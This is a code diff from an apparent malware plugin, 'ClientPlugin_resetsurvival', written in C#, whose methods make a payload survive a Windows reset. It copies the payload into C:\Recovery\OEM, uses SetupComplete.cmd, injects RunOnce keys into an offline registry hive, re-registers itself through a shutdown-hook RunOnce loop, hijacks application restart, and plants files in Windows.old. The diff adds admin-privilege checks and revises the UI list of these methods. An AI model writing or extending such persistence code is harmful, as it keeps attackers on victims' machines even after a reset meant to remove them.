@@ -299,6 +299,7 @@ namespace ClientPlugin_resetsurvival
         // ==================== 1. Recovery OEM ====================
         private void InstallRecoveryOEM()
         {
+            if (!IsAdmin) throw new UnauthorizedAccessException(""Admin required — cannot write to C:\\Recovery\\OEM."");
             string oemDir = @""C:\Recovery\OEM"";
             Directory.CreateDirectory(oemDir);
             string dest = Path.Combine(oemDir, GetExeName());
@@ -315,6 +316,7 @@ namespace ClientPlugin_resetsurvival
         // ==================== 2. SetupComplete.cmd ====================
         private void InstallSetupComplete()
         {
+            if (!IsAdmin) throw new UnauthorizedAccessException(""Admin required — cannot write to C:\\Recovery\\OEM."");
             string oemDir = @""C:\Recovery\OEM"";
             Directory.CreateDirectory(oemDir);
             string oemPayload = Path.Combine(oemDir, GetExeName());
@@ -438,6 +440,7 @@ namespace ClientPlugin_resetsurvival
         // ==================== 6. Windows.old ====================
         private void InstallWindowsOld()
         {
+            if (!IsAdmin) throw new UnauthorizedAccessException(""Admin required — cannot write to C:\\Windows.old."");
             try
             {
                 string winOld = @""C:\Windows.old"";
@@ -760,7 +763,7 @@ namespace ClientPlugin_resetsurvival
             cp.Children.Add(Hdr("Method Descriptions"));
             var info = new TextBlock
             {
-                Text = "OEM Dir: Copy to C:\\Recovery\\OEM (survives reset)\nSetupComplete: Script runs after Windows reset finishes\nOffline Reg: Mount SOFTWARE hive, inject RunOnce (Admin)\nRunOnce Loop: Self-reinstalling RunOnce via shutdown hook\nPhantom: RegisterApplicationRestart + WM_ENDSESSION hijack\nWindows.old: Place payload in C:\\Windows.old preserved paths",
+                Text = "OEM Dir (Admin): Copy to C:\\Recovery\\OEM\nSetupComplete (Admin): Script runs after reset\nOffline Reg (Admin): Mount hive, inject RunOnce\nRunOnce Loop (No admin): HKCU RunOnce self-reinstall\nPhantom (No admin): RegisterApplicationRestart\nWindows.old (Admin): Payload in preserved paths",
                 Foreground = new SolidColorBrush(TextDimColor),
                 FontSize = 11, TextWrapping = TextWrapping.Wrap,
                 Margin = new Thickness(0, 0, 0, 8), LineHeight = 18
